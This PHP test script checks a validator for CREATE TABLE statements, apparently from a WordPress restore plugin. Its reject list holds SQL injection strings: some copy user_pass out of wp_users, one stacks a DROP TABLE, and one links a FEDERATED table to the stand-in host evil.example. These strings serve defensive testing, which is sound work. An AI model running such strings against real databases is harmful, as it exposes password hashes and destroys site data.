<?php
require __DIR__ . '/validator.php';

$tmp = 'wp_restorepilot_rtmp_abc123_0';

$must_reject = [
  'CREATE ... SELECT'                => "CREATE TABLE `$tmp` (`x` int) SELECT * FROM wp_users",
  'CREATE ... AS SELECT'             => "CREATE TABLE `$tmp` (`x` int) AS SELECT user_pass FROM wp_users",
  'CREATE ... SELECT w/ subquery'    => "CREATE TABLE `$tmp` (`x` int) SELECT * FROM (SELECT user_pass FROM wp_users) t",
  'CREATE ... ENGINE then SELECT'    => "CREATE TABLE `$tmp` (`x` int) ENGINE=InnoDB SELECT * FROM wp_users",
  'stacked statement'                => "CREATE TABLE `$tmp` (`x` int); DROP TABLE wp_users",
  'executable comment'               => "CREATE TABLE `$tmp` (`x` int) /*!50100 SELECT * FROM wp_users */",
  'FEDERATED CONNECTION'             => "CREATE TABLE `$tmp` (`x` int) ENGINE=FEDERATED CONNECTION='mysql://evil.example/db/t'",
  'DATA DIRECTORY'                   => "CREATE TABLE `$tmp` (`x` int) DATA DIRECTORY='/etc'",
  'wrong table name'                 => "CREATE TABLE `wp_users` (`x` int)",
  'LIKE form'                        => "CREATE TABLE `$tmp` LIKE wp_users",
  'unbalanced parens'                => "CREATE TABLE `$tmp` (`x` int",
  'comment-hidden select'            => "CREATE TABLE `$tmp` (`x` int COMMENT 'ok') UNION SELECT 1",
];

$must_accept = [
  'plain InnoDB' =>
    "CREATE TABLE `$tmp` (\n  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",
  'full option set' =>
    "CREATE TABLE `$tmp` (\n  `id` bigint(20) NOT NULL AUTO_INCREMENT,\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB AUTO_INCREMENT=181 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_520_ci ROW_FORMAT=DYNAMIC",
  'paren inside default value' =>
    "CREATE TABLE `$tmp` (\n  `a` varchar(50) NOT NULL DEFAULT 'has ( paren',\n  PRIMARY KEY (`a`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",
  'table COMMENT with paren+quote' =>
    "CREATE TABLE `$tmp` (`a` int) ENGINE=InnoDB COMMENT='a ) tricky '' comment'",
  'composite PK' =>
    "CREATE TABLE `$tmp` (\n  `object_id` bigint(20) NOT NULL,\n  `term_taxonomy_id` bigint(20) NOT NULL,\n  PRIMARY KEY (`object_id`,`term_taxonomy_id`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4",
  'MEMORY engine' =>
    "CREATE TABLE `$tmp` (`a` int) ENGINE=MEMORY DEFAULT CHARSET=utf8mb4",
];

$fail = 0;
echo "--- MUST REJECT ---\n";
foreach ($must_reject as $label => $sql) {
  $r = validate_create($sql, $tmp);
  $ok = strpos($r, 'REJECTED') === 0;
  if (!$ok) { $fail++; }
  printf("%-32s %-10s %s\n", $label, $ok ? 'PASS' : 'FAIL!!', $r);
}

echo "\n--- MUST ACCEPT ---\n";
foreach ($must_accept as $label => $sql) {
  $r = validate_create($sql, $tmp);
  $ok = strpos($r, 'ACCEPTED') !== false;
  if (!$ok) { $fail++; }
  printf("%-32s %-10s %s\n", $label, $ok ? 'PASS' : 'FAIL!!', $r);
}

echo "\n" . ($fail === 0 ? "ALL PASS\n" : "$fail FAILURE(S)\n");
